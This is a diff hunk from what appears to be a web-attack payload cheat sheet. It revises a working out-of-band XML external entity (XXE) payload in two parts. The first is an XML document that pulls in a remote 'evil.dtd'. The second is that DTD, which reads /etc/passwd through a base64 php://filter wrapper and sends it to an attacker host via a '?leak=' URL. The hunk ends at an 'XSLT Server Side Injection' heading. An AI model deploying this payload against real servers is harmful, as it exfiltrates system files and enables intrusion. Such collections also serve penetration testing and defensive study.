@@ -667,27 +667,27 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 
 -> Part 1
 
-\<!DOCTYPE okay[
+\<!DOCTYPE r[
+
+\<!ELEMENT r ANY>
 
 \<!ENTITY % ult SYSTEM "http://ip/evil.dtd">
 
 %ult;
 
-]
+%param1;
 
-\>
+]>
+
+<r>&exfil;</r>
 
 -> Part 2
   
 codes/xxe_oob/evil.dtd
   
-\<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+\<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
   
-\<!ENTITY % payload "<!ENTITY &\#37; remote SYSTEM 'http://ip/?leak=%file;'>">
-  
-%payload;
-  
-%remote;
+\<!ENTITY % param1 "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">
   
 ## XSLT Server Side Injection
   
